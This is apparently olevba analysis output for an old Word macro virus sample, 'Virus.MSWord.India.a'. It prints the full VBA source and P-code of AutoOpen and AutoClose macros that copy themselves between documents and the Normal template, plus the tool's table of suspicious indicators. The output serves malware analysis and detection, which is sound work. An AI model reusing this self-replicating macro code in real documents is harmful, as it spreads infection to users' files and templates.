olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.India.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.India.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.India.a - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
Dim sMe$
Dim sMacro$
WordBasic.MsgBox "Ravi Good Bye", "I Love India"
WordBasic.MsgBox WordBasic.[MacroFileName$]()
WordBasic.DisableAutoMacros 0
On Error GoTo -1: On Error GoTo Abort

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
'dlg.Password = "India"
'dlg.WritePassword = "India"
'FileSaveAs dlg
'--------------------------------------------------------

sMe$ = WordBasic.[FileName$]()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sMacro$
sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:AutoOpen", sMacro$
WordBasic.FileSaveAs dlg

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.India.a - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim sMe$
Dim sMacro$

sMe$ = WordBasic.[FileName$]()

WordBasic.MsgBox "Ravi, Have a nice day", "I Love India"
WordBasic.MsgBox WordBasic.[MacroFileName$]()
sMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy sMacro$, "Global:AutoClose"

sMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy sMacro$, "Global:AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.India.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 2971 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn sMe
' Line #4:
' 	Dim 
' 	VarDefn sMacro
' Line #5:
' 	LitStr 0x000D "Ravi Good Bye"
' 	LitStr 0x000C "I Love India"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #9:
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' Line #13:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #15:
' 	QuoteRem 0x0000 0x0016 "dlg.Password = "India""
' Line #16:
' 	QuoteRem 0x0000 0x001B "dlg.WritePassword = "India""
' Line #17:
' 	QuoteRem 0x0000 0x000E "FileSaveAs dlg"
' Line #18:
' 	QuoteRem 0x0000 0x0038 "--------------------------------------------------------"
' Line #19:
' Line #20:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #22:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #24:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #26:
' Line #27:
' 	Label Abort 
' Line #28:
' 	EndSub 
' Macros/VBA/AutoOpen - 1451 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn sMe
' Line #4:
' 	Dim 
' 	VarDefn sMacro
' Line #5:
' Line #6:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #7:
' Line #8:
' 	LitStr 0x0015 "Ravi, Have a nice day"
' 	LitStr 0x000C "I Love India"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St sMacro$ 
' Line #11:
' 	Ld sMacro$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #14:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' Line #16:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

